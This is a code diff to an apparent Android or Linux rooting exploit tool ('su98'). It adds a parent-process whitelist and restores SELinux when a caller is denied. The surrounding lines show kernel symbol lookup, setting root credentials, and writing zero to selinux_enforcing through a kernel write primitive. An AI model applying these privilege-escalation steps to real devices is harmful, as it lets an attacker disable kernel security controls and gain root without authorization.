@@ -79,6 +79,8 @@
 
 int quiet = 0;
 
+const char whitelist[] = "su98-whitelist.txt";
+const char denyfile[] = "su98-denied.txt";
 int have_kallsyms = 0;
 int kernel3 = 1;
 char* myPath;
@@ -998,6 +1000,88 @@ void checkKernelVersion() {
         else message("MAIN: detected kernel version other than 3");
 }
 
+int checkWhitelist() {
+    char *path = alloca(strlen(myPath) + sizeof(whitelist));
+    strcpy(path, myPath);
+    strcat(path, whitelist);
+
+    FILE* wl = fopen(path, "rw");
+    
+    if (wl == NULL) {
+        message("MAIN: no whitelist, so all callers are welcome");
+        return 1;
+    }
+    
+    int allowed = 0;
+    char parent[1024] = "";
+    char procLine[32];
+    sprintf(procLine, "/proc/%u/cmdline", getppid());
+    
+    FILE* pcmd = fopen(procLine, "r");
+    
+    if (pcmd == NULL)
+        goto DONE;
+    
+    int i = 0;
+    
+    while(i<sizeof(parent)-1) {
+        int c = fgetc(pcmd);
+        if (c<0)
+            parent[i] = 0;
+        else
+            parent[i] = c;
+        if (c == 0)
+            break;
+        i++;
+    }
+    fclose(pcmd);
+    parent[i] = 0;
+
+    char line[512];
+    while (NULL != fgets(line, sizeof(line), wl)) {
+        line[sizeof(line)-1] = 0;
+        char* p = line;
+        while (*p && isspace(*p))
+            p++;
+        char*q = p + strlen(p) - 1;
+        while (p < q && isspace(*q)) 
+            *q-- = 0;
+        if (q <= p)
+            continue;
+        if (*q == '*') {
+            if (!strncmp(parent, p, q-p-1)) {
+                allowed = 1;
+                goto DONE;
+            }
+        }
+        else if (!strcmp(parent,p)) {
+            allowed = 1;
+            goto DONE;
+        }
+    }
+
+DONE:
+    fclose(wl);
+    
+    if (allowed)
+        message("MAIN: whitelist allows %s", parent);
+    else {
+        message("MAIN: whitelist does not allow %s", parent);
+        if (parent[0]) {
+            char *path = alloca(strlen(myPath) + sizeof(denyfile));
+            strcpy(path, myPath);
+            strcat(path, denyfile);
+            FILE* f = fopen(path, "w+");
+            if (f != NULL) {
+                fprintf(f, "%s\n", parent);
+                fclose(f);
+            }        
+        }
+    }
+    
+    return allowed;
+}
+
 int main(int argc, char **argv)
 {
     int command = 0;
@@ -1117,6 +1201,7 @@ int main(int argc, char **argv)
     
     message("MAIN: searching for selinux_enforcing");
     unsigned long selinux_enforcing = findSymbol(search_base, "selinux_enforcing");
+    
 //    unsigned long selinux_enabled = findSymbol(search_base, "selinux_enabled");
 
     message("MAIN: setting root credentials with cred offset %lx", offset_task_struct__cred);
@@ -1157,15 +1242,19 @@ int main(int argc, char **argv)
             message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
         }
     }
+    
+    unsigned prev_selinux_enforcing = 1;
 
     if (selinux_enforcing == 0)
         message("MAIN: **FAIL** did not find selinux_enforcing symbol");
     else
     {
+        prev_selinux_enforcing = kernel_read_uint(selinux_enforcing);
         kernel_write_uint(selinux_enforcing, 0);
         message("MAIN: disabled selinux enforcing");
         
-    cacheSymbol("selinux_enforcing", selinux_enforcing);
+        cacheSymbol("selinux_enforcing", selinux_enforcing);
+    }
     
     if (rejoinNS) {
         message("MAIN: re-joining the init mount namespace");
@@ -1195,6 +1284,14 @@ int main(int argc, char **argv)
         }    
     }
     
+    if (!checkWhitelist()) {
+        if (0 != selinux_enforcing) {
+            message("MAIN: restoring selinux state");
+            kernel_write_uint(selinux_enforcing, prev_selinux_enforcing);
+        }
+        exit(0);
+    }
+    
     message("MAIN: root privileges ready");
         
 /* process hangs if these are done */        
@@ -1203,7 +1300,6 @@ int main(int argc, char **argv)
 //        kernel_write_uint(security_ptr+4, 1310);
 //        for (int i=0; i<6; i++)
 //           message("SID %u : ", kernel_read_uint(security_ptr + 4 * i));  
-    }
 
     if (dump) {
         unsigned long start, count;
